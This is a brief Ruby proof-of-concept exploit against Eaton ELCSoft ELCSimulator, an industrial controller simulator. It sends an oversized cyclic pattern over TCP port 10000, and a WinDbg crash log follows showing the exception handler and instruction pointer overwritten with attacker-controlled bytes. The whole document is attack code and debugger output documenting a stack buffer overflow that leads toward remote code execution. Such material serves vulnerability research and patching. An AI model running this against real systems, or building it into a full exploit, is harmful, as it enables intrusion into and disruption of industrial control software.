#!/usr/bin/env ruby 
# Eaton ELCSoft ELCSimulator Stack-based Buffer Overflow Remote Code Execution Vulnerability
require 'rex'

sock = Rex::Socket::Tcp.create('PeerHost'  => target_here, 'PeerPort'  => 10000)

buffer = Rex::Text.pattern_create(2024) + "\r\n"

sock.write(buffer)
__END__
(f80.4cc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012fb34 ebx=013b6eb4 ecx=000000c7 edx=000007ea esi=013b8a10 edi=00130000
eip=00512d67 esp=0012fb10 ebp=0012fb18 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010207
DVPSimulator!Cxgeometryinitialization$qqrv+0x7b9bf:
00512d67 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:000> !exchain
0012fcdc: 336f4132
Invalid exception stack at 6f41316f
0:000> g
(f80.4cc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=336f4132 edx=7714660d esi=00000000 edi=00000000
eip=336f4132 esp=0012f728 ebp=0012f748 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
336f4132 ??              ???
0:000> kv
ChildEBP RetAddr  Args to Child              
WARNING: Frame IP not in any known module. Following frames may be wrong.
0012f724 771465f9 0012f810 0012fcdc 0012f82c 0x336f4132
0012f748 771465cb 0012f810 0012fcdc 0012f82c ntdll!ExecuteHandler2+0x26
0012f7f8 77146457 0012f810 0012f82c 0012f810 ntdll!ExecuteHandler+0x24
0012f7f8 00512d67 0012f810 0012f82c 0012f810 ntdll!KiUserExceptionDispatcher+0xf (FPO: [2,0,0]) (CONTEXT @ 0012f82c)
0012fb18 004030a0 0012fb34 013b8544 000007ea DVPSimulator!Cxgeometryinitialization$qqrv+0x7b9bf
0012fd0c 39704138 41307141 71413171 33714132 DVPSimulator!ServerFinalize+0x438
0012fd10 41307141 71413171 33714132 41347141 0x39704138
0012fd14 71413171 33714132 41347141 71413571 0x41307141
0012fd18 33714132 41347141 71413571 37714136 0x71413171
0012fd1c 41347141 71413571 37714136 41387141 0x33714132
0012fd20 71413571 37714136 41387141 72413971 0x41347141
0012fd24 37714136 41387141 72413971 31724130 0x71413571
0012fd28 41387141 72413971 31724130 41327241 0x37714136
0012fd2c 72413971 31724130 41327241 72413372 0x41387141
0012fd30 31724130 41327241 72413372 35724134 0x72413971
0012fd34 41327241 72413372 35724134 41367241 0x31724130
0012fd38 72413372 35724134 41367241 72413772 0x41327241
0012fd3c 35724134 41367241 72413772 39724138 0x72413372
0012fd40 41367241 72413772 39724138 41307341 0x35724134
0012fd44 72413772 39724138 41307341 73413173 0x41367241
0:000> lmvm DVPSimulator
start    end        module name
00400000 005c0000   DVPSimulator C (export symbols)       C:\Program Files\EATON\ELC\ELCSimulator.exe
    Loaded symbol image file: C:\Program Files\EATON\ELC\ELCSimulator.exe
    Image path: DVPSimulator.exe
    Image name: DVPSimulator.exe
    Timestamp:        Mon Oct 15 00:36:32 2012 (507BAEF0)
    CheckSum:         00000000
    ImageSize:        001C0000
    Translations:     0000.04b0 0000.04e0 0409.04b0 0409.04e0

